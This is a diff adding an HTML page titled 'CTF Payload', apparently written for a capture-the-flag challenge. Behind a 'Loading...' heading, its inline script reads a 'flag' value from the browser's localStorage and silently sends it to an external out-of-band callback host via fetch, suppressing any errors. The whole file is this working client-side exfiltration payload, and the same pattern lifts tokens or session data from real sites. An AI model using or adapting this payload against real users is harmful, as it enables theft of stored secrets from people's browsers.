@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CTF Payload</title>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    (function() {
+      const flag = localStorage.getItem('flag');
+      if (flag) {
+        fetch('https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/?flag=' + encodeURIComponent(flag))
+          .catch(() => {}); // ignore errors
+      }
+    })();
+  </script>
+</body>
+</html>
